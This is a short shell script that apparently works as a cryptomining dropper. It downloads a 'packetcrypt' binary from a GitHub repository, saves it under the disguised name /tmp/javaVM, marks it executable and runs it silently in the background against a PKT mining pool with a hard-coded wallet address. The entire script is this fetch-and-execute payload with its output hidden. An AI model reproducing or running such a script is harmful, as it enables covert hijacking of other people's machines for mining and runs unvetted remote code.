#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM ann -p pPwWgG6xJez1pdt4qkH1GqmeBJ6MHCGEue http://pool.pkt.world > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://github.com/thesunofme/trash/raw/main/packetcrypt -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM ann -p pPwWgG6xJez1pdt4qkH1GqmeBJ6MHCGEue http://pool.pkt.world > /dev/null 2>&1 &
fi
